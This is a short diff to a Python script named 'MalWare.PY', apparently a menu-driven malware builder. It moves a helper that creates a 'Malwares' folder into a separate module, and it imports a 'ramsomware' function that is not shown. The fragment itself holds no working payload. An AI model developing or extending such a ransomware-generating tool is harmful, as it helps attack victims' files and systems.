@@ -25,20 +25,15 @@ For any questions, see: https://github.com/SysAdminSecure.
 
 
 ## MalWare.PYdd
-import os  
-from complemets import  Banner, color
-from complemets.Script import ramsomware,clear_screen
+import os 
+import platform
+from complemets import color
+from complemets.Script import ramsomware,clear_screen,carpeta
 
 ##global
 run_mwpy = True
   
-def carpeta():
-    ##Folder Validation and Creation
-    if os.path.exists("Malwares"):
-        print('la carpeta ya ha sido creada')
-    else:
-        os.mkdir("Malwares")
-      
+  
 def exit_mwpy():
     ##exit mwpy
     global run_mwpy
@@ -68,6 +63,9 @@ malware creation options{color.YELLOW}
             
             
 carpeta()
+
+
+
 ##cycle to keep the scrip active
 if run_mwpy:
    
